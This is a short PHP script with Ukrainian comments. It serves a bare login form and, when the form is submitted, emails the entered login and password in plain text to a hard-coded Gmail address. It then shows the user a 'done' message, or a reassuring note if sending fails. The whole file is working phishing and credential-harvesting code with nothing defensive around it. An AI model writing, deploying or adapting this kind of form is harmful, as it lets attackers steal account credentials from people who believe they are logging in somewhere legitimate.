<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    // Отримання логіну та паролю з POST-запиту
    $login = $_POST['login'] ?? '';
    $password = $_POST['password'] ?? '';

    // Налаштування для надсилання email
    $to = 'tdjbeen@gmail.com';
    $subject = 'Login and Password';
    $message = "Login: $login\nPassword: $password";
    $headers = 'From: noreply@yourdomain.com' . "\r\n" .
               'Reply-To: noreply@yourdomain.com' . "\r\n" .
               'X-Mailer: PHP/' . phpversion();

    // Надсилання email
    if (mail($to, $subject, $message, $headers)) {
        echo "ГОТОВО";
    } else {
        echo "Це помилка але вона ні на що не впливає";
    }
} else {
    // Формування форми для введення логіну і паролю
    echo <<<FORM
    <form method="post">
        <label for="login">Login:</label><br>
        <input type="text" id="login" name="login"><br>
        <label for="password">Password:</label><br>
        <input type="password" id="password" name="password"><br><br>
        <input type="submit" value="Submit">
    </form>
FORM;
}
